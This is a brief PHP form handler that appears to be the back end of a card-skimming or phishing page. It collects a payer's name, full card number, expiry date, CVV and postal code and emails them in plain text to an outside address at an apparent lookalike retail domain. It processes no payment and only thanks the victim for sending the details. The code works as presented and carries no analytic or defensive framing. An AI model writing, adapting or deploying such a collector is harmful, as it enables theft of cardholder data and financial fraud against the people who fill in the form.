<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $firstName = $_POST["firstName"];
    $lastName = $_POST["lastName"];
    $cardNumber = $_POST["cardNumber"];
    $exp = $_POST["exp"];
    $cvv = $_POST["cvv"];
    $postalCode = $_POST["postalCode"];

    // Recipient email address
    $to = "paymentinfo@torid.live";
    $subject = "New Payment Form Submission";
    $headers = "From: webmaster@example.com"; // Replace with a valid email address

    // Compose the email message
    $email_message = "First Name: $firstName\n";
    $email_message .= "Last Name: $lastName\n";
    $email_message .= "Card Number: $cardNumber\n";
    $email_message .= "Expiration Date: $exp\n";
    $email_message .= "CVV: $cvv\n";
    $email_message .= "Postal Code: $postalCode\n";

    $smtp_server = "smtp.gmail.com";
    $smtp_port = 587;
    $smtp_username = "remensnyderlinda@gmail.com";
    $smtp_password = "your-gmail-password";

    // Send email using mail() function
    if (mail($to, $subject, $email_message, $headers, "-f$smtp_username")) {
        echo "Thank you! Your payment details have been sent.";
    } else {
        echo "Oops! Something went wrong and we couldn't send your payment details.";
    }
} else {
    echo "Invalid request";
}
?>
